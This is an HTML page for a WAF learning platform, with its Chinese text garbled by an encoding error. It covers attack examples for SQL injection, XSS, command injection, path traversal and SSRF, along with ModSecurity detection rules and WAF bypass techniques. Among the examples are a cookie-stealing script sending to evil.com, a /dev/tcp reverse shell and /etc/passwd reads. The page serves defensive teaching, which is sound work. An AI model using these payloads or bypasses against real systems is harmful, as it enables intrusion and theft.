<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>What The WAF - WAF å­¸ç¿’å¹³å°</title>
    <style>
        :root {
            --primary: #6366f1;
            --primary-dark: #4f46e5;
            --secondary: #10b981;
            --danger: #ef4444;
            --warning: #f59e0b;
            --bg-dark: #0f172a;
            --bg-card: #1e293b;
            --bg-code: #334155;
            --text-primary: #f1f5f9;
            --text-secondary: #94a3b8;
            --border: #334155;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: var(--bg-dark);
            color: var(--text-primary);
            line-height: 1.6;
        }

        /* Navigation */
        nav {
            position: fixed;
            top: 0;
            width: 100%;
            background: rgba(15, 23, 42, 0.95);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid var(--border);
            z-index: 1000;
            padding: 1rem 2rem;
        }

        nav .container {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            font-size: 1.5rem;
            font-weight: bold;
            color: var(--primary);
        }

        .nav-links {
            display: flex;
            gap: 2rem;
            list-style: none;
        }

        .nav-links a {
            color: var(--text-secondary);
            text-decoration: none;
            transition: color 0.3s;
        }

        .nav-links a:hover {
            color: var(--primary);
        }

        /* Hero Section */
        .hero {
            padding: 8rem 2rem 4rem;
            text-align: center;
            background: linear-gradient(135deg, var(--bg-dark) 0%, #1a1a2e 100%);
        }

        .hero h1 {
            font-size: 3.5rem;
            margin-bottom: 1rem;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .hero p {
            font-size: 1.25rem;
            color: var(--text-secondary);
            max-width: 600px;
            margin: 0 auto 2rem;
        }

        /* Container */
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem;
        }

        /* Section */
        section {
            padding: 4rem 0;
        }

        section h2 {
            font-size: 2rem;
            margin-bottom: 2rem;
            color: var(--text-primary);
            border-left: 4px solid var(--primary);
            padding-left: 1rem;
        }

        /* Cards */
        .card-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1.5rem;
        }

        .card {
            background: var(--bg-card);
            border-radius: 12px;
            padding: 1.5rem;
            border: 1px solid var(--border);
            transition: transform 0.3s, box-shadow 0.3s;
        }

        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 40px rgba(99, 102, 241, 0.2);
        }

        .card h3 {
            color: var(--primary);
            margin-bottom: 1rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .card p {
            color: var(--text-secondary);
        }

        /* Attack Types */
        .attack-badge {
            display: inline-block;
            padding: 0.25rem 0.75rem;
            border-radius: 20px;
            font-size: 0.875rem;
            margin-bottom: 1rem;
        }

        .badge-critical {
            background: rgba(239, 68, 68, 0.2);
            color: var(--danger);
        }

        .badge-high {
            background: rgba(245, 158, 11, 0.2);
            color: var(--warning);
        }

        .badge-medium {
            background: rgba(99, 102, 241, 0.2);
            color: var(--primary);
        }

        /* Code Block */
        .code-block {
            background: var(--bg-code);
            border-radius: 8px;
            padding: 1rem;
            margin: 1rem 0;
            overflow-x: auto;
            font-family: 'Monaco', 'Menlo', monospace;
            font-size: 0.875rem;
            border: 1px solid var(--border);
        }

        .code-block code {
            color: #e2e8f0;
        }

        .code-comment {
            color: #6b7280;
        }

        .code-keyword {
            color: var(--primary);
        }

        .code-string {
            color: var(--secondary);
        }

        .code-danger {
            color: var(--danger);
        }

        /* Interactive Quiz */
        .quiz-container {
            background: var(--bg-card);
            border-radius: 12px;
            padding: 2rem;
            border: 1px solid var(--border);
        }

        .quiz-question {
            margin-bottom: 1.5rem;
        }

        .quiz-question h4 {
            margin-bottom: 1rem;
            color: var(--text-primary);
        }

        .quiz-input {
            width: 100%;
            padding: 1rem;
            background: var(--bg-code);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text-primary);
            font-family: monospace;
            margin-bottom: 1rem;
        }

        .quiz-options {
            display: flex;
            flex-direction: column;
            gap: 0.75rem;
        }

        .quiz-option {
            padding: 1rem;
            background: var(--bg-code);
            border: 2px solid var(--border);
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s;
            color: var(--text-primary);
        }

        .quiz-option:hover {
            border-color: var(--primary);
        }

        .quiz-option.correct {
            border-color: var(--secondary);
            background: rgba(16, 185, 129, 0.1);
        }

        .quiz-option.incorrect {
            border-color: var(--danger);
            background: rgba(239, 68, 68, 0.1);
        }

        .btn {
            padding: 0.75rem 1.5rem;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1rem;
            transition: all 0.3s;
        }

        .btn-primary {
            background: var(--primary);
            color: white;
        }

        .btn-primary:hover {
            background: var(--primary-dark);
        }

        .btn-secondary {
            background: var(--bg-code);
            color: var(--text-primary);
            border: 1px solid var(--border);
        }

        .result-box {
            padding: 1rem;
            border-radius: 8px;
            margin-top: 1rem;
            display: none;
        }

        .result-box.show {
            display: block;
        }

        .result-success {
            background: rgba(16, 185, 129, 0.1);
            border: 1px solid var(--secondary);
            color: var(--secondary);
        }

        .result-error {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid var(--danger);
            color: var(--danger);
        }

        /* WAF Rule Demo */
        .rule-demo {
            background: var(--bg-card);
            border-radius: 12px;
            padding: 2rem;
            margin-top: 1.5rem;
            border: 1px solid var(--border);
        }

        .rule-input-group {
            display: flex;
            gap: 1rem;
            margin-bottom: 1rem;
        }

        .rule-input-group input {
            flex: 1;
            padding: 0.75rem 1rem;
            background: var(--bg-code);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text-primary);
            font-family: monospace;
        }

        .detection-result {
            padding: 1rem;
            border-radius: 8px;
            margin-top: 1rem;
        }

        .detection-blocked {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid var(--danger);
        }

        .detection-allowed {
            background: rgba(16, 185, 129, 0.1);
            border: 1px solid var(--secondary);
        }

        /* Tabs */
        .tabs {
            display: flex;
            gap: 0.5rem;
            margin-bottom: 1.5rem;
            flex-wrap: wrap;
        }

        .tab {
            padding: 0.75rem 1.5rem;
            background: var(--bg-code);
            border: 1px solid var(--border);
            border-radius: 8px;
            cursor: pointer;
            color: var(--text-secondary);
            transition: all 0.3s;
        }

        .tab:hover {
            color: var(--text-primary);
        }

        .tab.active {
            background: var(--primary);
            color: white;
            border-color: var(--primary);
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        /* Accordion */
        .accordion {
            border: 1px solid var(--border);
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 1rem;
        }

        .accordion-header {
            padding: 1rem 1.5rem;
            background: var(--bg-card);
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: background 0.3s;
        }

        .accordion-header:hover {
            background: var(--bg-code);
        }

        .accordion-header h4 {
            color: var(--text-primary);
        }

        .accordion-icon {
            transition: transform 0.3s;
        }

        .accordion.active .accordion-icon {
            transform: rotate(180deg);
        }

        .accordion-content {
            padding: 0 1.5rem;
            max-height: 0;
            overflow: hidden;
            transition: all 0.3s;
            background: var(--bg-card);
        }

        .accordion.active .accordion-content {
            padding: 1.5rem;
            max-height: 2000px;
        }

        /* Progress Bar */
        .progress-container {
            margin-bottom: 2rem;
        }

        .progress-bar {
            height: 8px;
            background: var(--bg-code);
            border-radius: 4px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            border-radius: 4px;
            transition: width 0.5s;
        }

        .progress-text {
            display: flex;
            justify-content: space-between;
            margin-top: 0.5rem;
            color: var(--text-secondary);
            font-size: 0.875rem;
        }

        /* Footer */
        footer {
            background: var(--bg-card);
            padding: 3rem 2rem;
            text-align: center;
            border-top: 1px solid var(--border);
        }

        footer p {
            color: var(--text-secondary);
        }

        footer a {
            color: var(--primary);
            text-decoration: none;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .nav-links {
                display: none;
            }

            .hero h1 {
                font-size: 2.5rem;
            }

            .rule-input-group {
                flex-direction: column;
            }
        }

        /* Animations */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .animate-in {
            animation: fadeIn 0.5s ease forwards;
        }

        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        ::-webkit-scrollbar-track {
            background: var(--bg-dark);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--border);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--primary);
        }
    </style>
</head>
<body>
    <!-- Navigation -->
    <nav>
        <div class="container">
            <div class="logo">ğŸ›¡ï¸ What The WAF</div>
            <ul class="nav-links">
                <li><a href="#intro">ä»‹ç´¹</a></li>
                <li><a href="#attacks">æ”»æ“Šé¡å‹</a></li>
                <li><a href="#rules">WAF è¦å‰‡</a></li>
                <li><a href="#bypass">ç¹éæŠ€è¡“</a></li>
                <li><a href="#quiz">å¯¦æˆ°ç·´ç¿’</a></li>
            </ul>
        </div>
    </nav>

    <!-- Hero Section -->
    <section class="hero">
        <h1>What The WAF</h1>
        <p>æ·±å…¥äº†è§£ Web Application Firewall çš„é‹ä½œåŸç†ï¼Œå­¸ç¿’å¦‚ä½•ä¿è­·æ‚¨çš„ç¶²ç«™æ‡‰ç”¨ç¨‹å¼å…å—å¸¸è¦‹æ”»æ“Š</p>
        <a href="#intro" class="btn btn-primary">é–‹å§‹å­¸ç¿’</a>
    </section>

    <div class="container">
        <!-- Introduction Section -->
        <section id="intro">
            <h2>ä»€éº¼æ˜¯ WAFï¼Ÿ</h2>
            <div class="card-grid">
                <div class="card">
                    <h3>ğŸ“‹ å®šç¾©</h3>
                    <p>Web Application Firewall (WAF) æ˜¯ä¸€ç¨®æ‡‰ç”¨å±¤é˜²ç«ç‰†ï¼Œå°ˆé–€ç”¨æ–¼ç›£æ§ã€éæ¿¾å’Œé˜»æ­¢é€²å‡º Web æ‡‰ç”¨ç¨‹å¼çš„ HTTP/HTTPS æµé‡ã€‚</p>
                </div>
                <div class="card">
                    <h3>ğŸ¯ ç›®çš„</h3>
                    <p>WAF ä¸»è¦ç›®çš„æ˜¯ä¿è­· Web æ‡‰ç”¨ç¨‹å¼å…å—å¸¸è¦‹çš„æ”»æ“Šï¼Œå¦‚ SQL Injectionã€XSSã€CSRF ç­‰ OWASP Top 10 å¨è„…ã€‚</p>
                </div>
                <div class="card">
                    <h3>âš™ï¸ é‹ä½œæ–¹å¼</h3>
                    <p>WAF é€éé å®šç¾©çš„è¦å‰‡é›†æˆ–æ©Ÿå™¨å­¸ç¿’æ¨¡å‹ä¾†åˆ†æ HTTP è«‹æ±‚ï¼Œè­˜åˆ¥ä¸¦é˜»æ­¢æƒ¡æ„æµé‡ã€‚</p>
                </div>
            </div>

            <div class="rule-demo" style="margin-top: 2rem;">
                <h3 style="margin-bottom: 1rem;">WAF æ¶æ§‹ç¤ºæ„</h3>
                <div class="code-block">
                    <code>
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  User   â”‚â”€â”€â”€â”€â–¶â”‚   WAF   â”‚â”€â”€â”€â”€â–¶â”‚ Web Server  â”‚â”€â”€â”€â”€â–¶â”‚ Database â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                     â”‚
                     â–¼
              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
              â”‚ Rule Engine â”‚
              â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚
              â”‚ â€¢ Signaturesâ”‚
              â”‚ â€¢ Regex     â”‚
              â”‚ â€¢ ML Model  â”‚
              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                    </code>
                </div>
            </div>
        </section>

        <!-- Attack Types Section -->
        <section id="attacks">
            <h2>å¸¸è¦‹æ”»æ“Šé¡å‹</h2>

            <div class="tabs">
                <button class="tab active" data-tab="sqli">SQL Injection</button>
                <button class="tab" data-tab="xss">XSS</button>
                <button class="tab" data-tab="rce">Command Injection</button>
                <button class="tab" data-tab="path">Path Traversal</button>
                <button class="tab" data-tab="ssrf">SSRF</button>
            </div>

            <!-- SQL Injection -->
            <div class="tab-content active" id="sqli">
                <div class="card">
                    <span class="attack-badge badge-critical">åš´é‡</span>
                    <h3>ğŸ’‰ SQL Injection (SQL æ³¨å…¥)</h3>
                    <p>æ”»æ“Šè€…é€éåœ¨è¼¸å…¥æ¬„ä½ä¸­æ³¨å…¥æƒ¡æ„ SQL ç¨‹å¼ç¢¼ï¼Œä¾†æ“æ§å¾Œç«¯è³‡æ–™åº«ã€‚</p>

                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">æ”»æ“Šç¯„ä¾‹ï¼š</h4>
                    <div class="code-block">
                        <code>
<span class="code-comment">-- åŸºæœ¬èªè­‰ç¹é</span>
<span class="code-danger">' OR '1'='1</span>
<span class="code-danger">' OR 1=1--</span>
<span class="code-danger">admin'--</span>

<span class="code-comment">-- Union æ”»æ“Š</span>
<span class="code-danger">' UNION SELECT username, password FROM users--</span>

<span class="code-comment">-- æ™‚é–“ç›²æ³¨</span>
<span class="code-danger">' AND SLEEP(5)--</span>
<span class="code-danger">' AND IF(1=1, SLEEP(5), 0)--</span>

<span class="code-comment">-- å †ç–ŠæŸ¥è©¢</span>
<span class="code-danger">'; DROP TABLE users;--</span>
                        </code>
                    </div>

                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">WAF åµæ¸¬è¦å‰‡ç¯„ä¾‹ï¼š</h4>
                    <div class="code-block">
                        <code>
<span class="code-comment"># ModSecurity è¦å‰‡ç¯„ä¾‹</span>
SecRule ARGS <span class="code-string">"(?i)(union.*select|select.*from|insert.*into|delete.*from|drop\s+table)"</span> \
    <span class="code-keyword">"id:1001,phase:2,deny,status:403,msg:'SQL Injection Detected'"</span>
                        </code>
                    </div>
                </div>
            </div>

            <!-- XSS -->
            <div class="tab-content" id="xss">
                <div class="card">
                    <span class="attack-badge badge-high">é«˜é¢¨éšª</span>
                    <h3>ğŸ”“ Cross-Site Scripting (XSS)</h3>
                    <p>æ”»æ“Šè€…å°‡æƒ¡æ„è…³æœ¬æ³¨å…¥åˆ°ç¶²é ä¸­ï¼Œç•¶å…¶ä»–ç”¨æˆ¶ç€è¦½è©²é é¢æ™‚åŸ·è¡Œã€‚</p>

                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">æ”»æ“Šç¯„ä¾‹ï¼š</h4>
                    <div class="code-block">
                        <code>
<span class="code-comment">// Reflected XSS</span>
<span class="code-danger">&lt;script&gt;alert('XSS')&lt;/script&gt;</span>
<span class="code-danger">&lt;img src=x onerror=alert('XSS')&gt;</span>

<span class="code-comment">// DOM-based XSS</span>
<span class="code-danger">&lt;svg onload=alert('XSS')&gt;</span>
<span class="code-danger">&lt;body onpageshow=alert('XSS')&gt;</span>

<span class="code-comment">// Cookie ç«Šå–</span>
<span class="code-danger">&lt;script&gt;new Image().src='http://evil.com/steal?c='+document.cookie&lt;/script&gt;</span>

<span class="code-comment">// äº‹ä»¶è™•ç†å™¨</span>
<span class="code-danger">&lt;div onmouseover="alert('XSS')"&gt;Hover me&lt;/div&gt;</span>
                        </code>
                    </div>

                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">WAF åµæ¸¬è¦å‰‡ç¯„ä¾‹ï¼š</h4>
                    <div class="code-block">
                        <code>
<span class="code-comment"># åµæ¸¬ script æ¨™ç±¤å’Œäº‹ä»¶è™•ç†å™¨</span>
SecRule ARGS <span class="code-string">"(?i)(&lt;script|javascript:|on\w+\s*=)"</span> \
    <span class="code-keyword">"id:1002,phase:2,deny,status:403,msg:'XSS Attack Detected'"</span>
                        </code>
                    </div>
                </div>
            </div>

            <!-- Command Injection -->
            <div class="tab-content" id="rce">
                <div class="card">
                    <span class="attack-badge badge-critical">åš´é‡</span>
                    <h3>ğŸ’» Command Injection (å‘½ä»¤æ³¨å…¥)</h3>
                    <p>æ”»æ“Šè€…é€éæ³¨å…¥ç³»çµ±å‘½ä»¤ï¼Œåœ¨ä¼ºæœå™¨ä¸ŠåŸ·è¡Œä»»æ„ç¨‹å¼ç¢¼ã€‚</p>

                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">æ”»æ“Šç¯„ä¾‹ï¼š</h4>
                    <div class="code-block">
                        <code>
<span class="code-comment"># å‘½ä»¤ä¸²æ¥</span>
<span class="code-danger">; ls -la</span>
<span class="code-danger">| cat /etc/passwd</span>
<span class="code-danger">&& whoami</span>

<span class="code-comment"># å‘½ä»¤æ›¿æ›</span>
<span class="code-danger">`id`</span>
<span class="code-danger">$(whoami)</span>

<span class="code-comment"># åå½ˆ Shell</span>
<span class="code-danger">; bash -i >& /dev/tcp/10.0.0.1/8080 0>&1</span>
                        </code>
                    </div>

                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">WAF åµæ¸¬è¦å‰‡ç¯„ä¾‹ï¼š</h4>
                    <div class="code-block">
                        <code>
<span class="code-comment"># åµæ¸¬å¸¸è¦‹å‘½ä»¤æ³¨å…¥æ¨¡å¼</span>
SecRule ARGS <span class="code-string">"(?i)(;|\||&&|\$\(|`).*(cat|ls|whoami|id|passwd|shadow)"</span> \
    <span class="code-keyword">"id:1003,phase:2,deny,status:403,msg:'Command Injection Detected'"</span>
                        </code>
                    </div>
                </div>
            </div>

            <!-- Path Traversal -->
            <div class="tab-content" id="path">
                <div class="card">
                    <span class="attack-badge badge-high">é«˜é¢¨éšª</span>
                    <h3>ğŸ“ Path Traversal (è·¯å¾‘ç©¿è¶Š)</h3>
                    <p>æ”»æ“Šè€…é€éæ“ä½œæª”æ¡ˆè·¯å¾‘ä¾†å­˜å–ä¼ºæœå™¨ä¸Šæœªæˆæ¬Šçš„æª”æ¡ˆã€‚</p>

                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">æ”»æ“Šç¯„ä¾‹ï¼š</h4>
                    <div class="code-block">
                        <code>
<span class="code-comment"># åŸºæœ¬è·¯å¾‘ç©¿è¶Š</span>
<span class="code-danger">../../../etc/passwd</span>
<span class="code-danger">....//....//....//etc/passwd</span>

<span class="code-comment"># URL ç·¨ç¢¼</span>
<span class="code-danger">%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd</span>
<span class="code-danger">..%252f..%252f..%252fetc/passwd</span>

<span class="code-comment"># Null Byte</span>
<span class="code-danger">../../../etc/passwd%00.jpg</span>

<span class="code-comment"># Windows è·¯å¾‘</span>
<span class="code-danger">..\..\..\windows\system32\config\sam</span>
                        </code>
                    </div>
                </div>
            </div>

            <!-- SSRF -->
            <div class="tab-content" id="ssrf">
                <div class="card">
                    <span class="attack-badge badge-high">é«˜é¢¨éšª</span>
                    <h3>ğŸŒ Server-Side Request Forgery (SSRF)</h3>
                    <p>æ”»æ“Šè€…èª˜å°ä¼ºæœå™¨å‘å…§éƒ¨ç¶²è·¯æˆ–å…¶ä»–æœå‹™ç™¼é€è«‹æ±‚ã€‚</p>

                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem;">æ”»æ“Šç¯„ä¾‹ï¼š</h4>
                    <div class="code-block">
                        <code>
<span class="code-comment"># å­˜å–å…§éƒ¨æœå‹™</span>
<span class="code-danger">http://localhost:8080/admin</span>
<span class="code-danger">http://127.0.0.1:3306/</span>

<span class="code-comment"># å­˜å–é›²ç«¯å…ƒè³‡æ–™</span>
<span class="code-danger">http://169.254.169.254/latest/meta-data/</span>
<span class="code-danger">http://metadata.google.internal/</span>

<span class="code-comment"># ç¹éæŠ€è¡“</span>
<span class="code-danger">http://0.0.0.0:8080/</span>
<span class="code-danger">http://[::]:8080/</span>
<span class="code-danger">http://127.1/</span>
                        </code>
                    </div>
                </div>
            </div>
        </section>

        <!-- WAF Rules Section -->
        <section id="rules">
            <h2>WAF è¦å‰‡è¨­è¨ˆ</h2>

            <div class="accordion">
                <div class="accordion-header" onclick="toggleAccordion(this)">
                    <h4>æ­£å‰‡è¡¨é”å¼åŸºç¤</h4>
                    <span class="accordion-icon">â–¼</span>
                </div>
                <div class="accordion-content">
                    <p>WAF è¦å‰‡å¤§é‡ä½¿ç”¨æ­£å‰‡è¡¨é”å¼ä¾†åŒ¹é…æƒ¡æ„æ¨¡å¼ï¼š</p>
                    <div class="code-block">
                        <code>
<span class="code-comment"># å¸¸ç”¨ Regex å…ƒå­—ç¬¦</span>
.       <span class="code-comment"># åŒ¹é…ä»»æ„å­—ç¬¦</span>
*       <span class="code-comment"># åŒ¹é…å‰ä¸€å€‹å­—ç¬¦ 0 æ¬¡æˆ–å¤šæ¬¡</span>
+       <span class="code-comment"># åŒ¹é…å‰ä¸€å€‹å­—ç¬¦ 1 æ¬¡æˆ–å¤šæ¬¡</span>
?       <span class="code-comment"># åŒ¹é…å‰ä¸€å€‹å­—ç¬¦ 0 æ¬¡æˆ– 1 æ¬¡</span>
\s      <span class="code-comment"># åŒ¹é…ç©ºç™½å­—ç¬¦</span>
\w      <span class="code-comment"># åŒ¹é…å­—æ¯æ•¸å­—å­—ç¬¦</span>
(?i)    <span class="code-comment"># å¤§å°å¯«ä¸æ•æ„Ÿ</span>
|       <span class="code-comment"># æˆ–é‹ç®—ç¬¦</span>

<span class="code-comment"># SQL æ³¨å…¥åµæ¸¬ç¯„ä¾‹</span>
<span class="code-string">(?i)(union\s+select|select\s+.*\s+from)</span>
                        </code>
                    </div>
                </div>
            </div>

            <div class="accordion">
                <div class="accordion-header" onclick="toggleAccordion(this)">
                    <h4>ModSecurity è¦å‰‡èªæ³•</h4>
                    <span class="accordion-icon">â–¼</span>
                </div>
                <div class="accordion-content">
                    <p>ModSecurity æ˜¯æœ€æµè¡Œçš„é–‹æº WAF å¼•æ“ï¼š</p>
                    <div class="code-block">
                        <code>
<span class="code-comment"># è¦å‰‡åŸºæœ¬çµæ§‹</span>
SecRule <span class="code-keyword">VARIABLE</span> <span class="code-string">"OPERATOR"</span> <span class="code-keyword">"ACTIONS"</span>

<span class="code-comment"># ç¯„ä¾‹ï¼šé˜»æ“‹ SQL æ³¨å…¥</span>
SecRule ARGS <span class="code-string">"(?i)union.*select"</span> \
    <span class="code-keyword">"id:1001,\
     phase:2,\
     deny,\
     status:403,\
     log,\
     msg:'SQL Injection Attack'"</span>

<span class="code-comment"># å¸¸ç”¨è®Šæ•¸</span>
ARGS            <span class="code-comment"># æ‰€æœ‰è«‹æ±‚åƒæ•¸</span>
REQUEST_URI     <span class="code-comment"># è«‹æ±‚ URI</span>
REQUEST_BODY    <span class="code-comment"># è«‹æ±‚ä¸»é«”</span>
REQUEST_HEADERS <span class="code-comment"># è«‹æ±‚æ¨™é ­</span>
                        </code>
                    </div>
                </div>
            </div>

            <div class="accordion">
                <div class="accordion-header" onclick="toggleAccordion(this)">
                    <h4>OWASP CRS (Core Rule Set)</h4>
                    <span class="accordion-icon">â–¼</span>
                </div>
                <div class="accordion-content">
                    <p>OWASP CRS æ˜¯ä¸€çµ„é€šç”¨çš„ WAF è¦å‰‡é›†ï¼š</p>
                    <div class="code-block">
                        <code>
<span class="code-comment"># è¦å‰‡é¡åˆ¥</span>
REQUEST-911-METHOD-ENFORCEMENT    <span class="code-comment"># HTTP æ–¹æ³•é™åˆ¶</span>
REQUEST-913-SCANNER-DETECTION     <span class="code-comment"># æƒæå™¨åµæ¸¬</span>
REQUEST-920-PROTOCOL-ENFORCEMENT  <span class="code-comment"># å”è­°è¦ç¯„</span>
REQUEST-930-APPLICATION-ATTACK-LFI <span class="code-comment"># LFI æ”»æ“Š</span>
REQUEST-931-APPLICATION-ATTACK-RFI <span class="code-comment"># RFI æ”»æ“Š</span>
REQUEST-932-APPLICATION-ATTACK-RCE <span class="code-comment"># RCE æ”»æ“Š</span>
REQUEST-933-APPLICATION-ATTACK-PHP <span class="code-comment"># PHP æ”»æ“Š</span>
REQUEST-941-APPLICATION-ATTACK-XSS <span class="code-comment"># XSS æ”»æ“Š</span>
REQUEST-942-APPLICATION-ATTACK-SQLI <span class="code-comment"># SQL æ³¨å…¥</span>
                        </code>
                    </div>
                </div>
            </div>

            <!-- Interactive WAF Demo -->
            <div class="rule-demo">
                <h3 style="margin-bottom: 1rem;">ğŸ” WAF å³æ™‚åµæ¸¬æ¨¡æ“¬å™¨</h3>
                <p style="color: var(--text-secondary); margin-bottom: 1rem;">è¼¸å…¥ä¸€æ®µ payload ä¾†æ¸¬è©¦ WAF æ˜¯å¦æœƒåµæ¸¬åˆ°æ”»æ“Šï¼š</p>

                <div class="rule-input-group">
                    <input type="text" id="waf-input" placeholder="è¼¸å…¥æ¸¬è©¦ payloadï¼Œä¾‹å¦‚ï¼š' OR 1=1--">
                    <button class="btn btn-primary" onclick="checkWAF()">æª¢æ¸¬</button>
                </div>

                <div id="waf-result"></div>

                <div style="margin-top: 1rem;">
                    <p style="color: var(--text-secondary); font-size: 0.875rem;">å¿«é€Ÿæ¸¬è©¦ï¼š</p>
                    <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin-top: 0.5rem;">
                        <button class="btn btn-secondary" onclick="setPayload(`' OR '1'='1`)">SQLi åŸºæœ¬</button>
                        <button class="btn btn-secondary" onclick="setPayload(`<script>alert(1)</script>`)">XSS åŸºæœ¬</button>
                        <button class="btn btn-secondary" onclick="setPayload(`; cat /etc/passwd`)">å‘½ä»¤æ³¨å…¥</button>
                        <button class="btn btn-secondary" onclick="setPayload(`../../../etc/passwd`)">è·¯å¾‘ç©¿è¶Š</button>
                        <button class="btn btn-secondary" onclick="setPayload(`hello world`)">æ­£å¸¸è¼¸å…¥</button>
                    </div>
                </div>
            </div>
        </section>

        <!-- Bypass Techniques -->
        <section id="bypass">
            <h2>WAF ç¹éæŠ€è¡“</h2>
            <p style="color: var(--text-secondary); margin-bottom: 2rem;">äº†è§£æ”»æ“Šè€…å¦‚ä½•å˜—è©¦ç¹é WAFï¼Œæœ‰åŠ©æ–¼è¨­è¨ˆæ›´å¼·å¥çš„é˜²è­·è¦å‰‡ã€‚</p>

            <div class="card-grid">
                <div class="card">
                    <h3>ğŸ”¤ å¤§å°å¯«è®Šæ›</h3>
                    <div class="code-block">
                        <code>
<span class="code-comment"># åŸå§‹</span>
UNION SELECT

<span class="code-comment"># ç¹éå˜—è©¦</span>
<span class="code-danger">UnIoN SeLeCt</span>
<span class="code-danger">uNiOn sElEcT</span>
                        </code>
                    </div>
                    <p style="margin-top: 1rem; font-size: 0.875rem; color: var(--text-secondary);">
                        <strong>é˜²è­·ï¼š</strong>ä½¿ç”¨ (?i) æ¨™è¨˜é€²è¡Œå¤§å°å¯«ä¸æ•æ„ŸåŒ¹é…
                    </p>
                </div>

                <div class="card">
                    <h3>ğŸ“ ç·¨ç¢¼ç¹é</h3>
                    <div class="code-block">
                        <code>
<span class="code-comment"># URL ç·¨ç¢¼</span>
<span class="code-danger">%27%20OR%20%271%27=%271</span>

<span class="code-comment"># é›™é‡ç·¨ç¢¼</span>
<span class="code-danger">%252f%252e%252e</span>

<span class="code-comment"># Unicode</span>
<span class="code-danger">%u0027</span>
                        </code>
                    </div>
                    <p style="margin-top: 1rem; font-size: 0.875rem; color: var(--text-secondary);">
                        <strong>é˜²è­·ï¼š</strong>åœ¨æª¢æ¸¬å‰é€²è¡Œå¤šå±¤è§£ç¢¼
                    </p>
                </div>

                <div class="card">
                    <h3>ğŸ’­ è¨»è§£æ’å…¥</h3>
                    <div class="code-block">
                        <code>
<span class="code-comment"># SQL è¨»è§£</span>
<span class="code-danger">UN/**/ION/**/SEL/**/ECT</span>
<span class="code-danger">UNION/*!50000SELECT*/</span>

<span class="code-comment"># HTML è¨»è§£</span>
<span class="code-danger">&lt;scr&lt;!--test--&gt;ipt&gt;</span>
                        </code>
                    </div>
                    <p style="margin-top: 1rem; font-size: 0.875rem; color: var(--text-secondary);">
                        <strong>é˜²è­·ï¼š</strong>ç§»é™¤è¨»è§£å¾Œå†é€²è¡Œæª¢æ¸¬
                    </p>
                </div>

                <div class="card">
                    <h3>â¬œ ç©ºç™½å­—ç¬¦è®Šæ›</h3>
                    <div class="code-block">
                        <code>
<span class="code-comment"># Tab ä»£æ›¿ç©ºæ ¼</span>
<span class="code-danger">UNION[TAB]SELECT</span>

<span class="code-comment"># æ›è¡Œç¬¦</span>
<span class="code-danger">UNION%0aSELECT</span>

<span class="code-comment"># å¤šå€‹ç©ºæ ¼</span>
<span class="code-danger">UNION    SELECT</span>
                        </code>
                    </div>
                    <p style="margin-top: 1rem; font-size: 0.875rem; color: var(--text-secondary);">
                        <strong>é˜²è­·ï¼š</strong>ä½¿ç”¨ \s+ åŒ¹é…ä»»æ„ç©ºç™½å­—ç¬¦
                    </p>
                </div>

                <div class="card">
                    <h3>ğŸ”„ åŒç¾©è©æ›¿æ›</h3>
                    <div class="code-block">
                        <code>
<span class="code-comment"># OR çš„æ›¿ä»£</span>
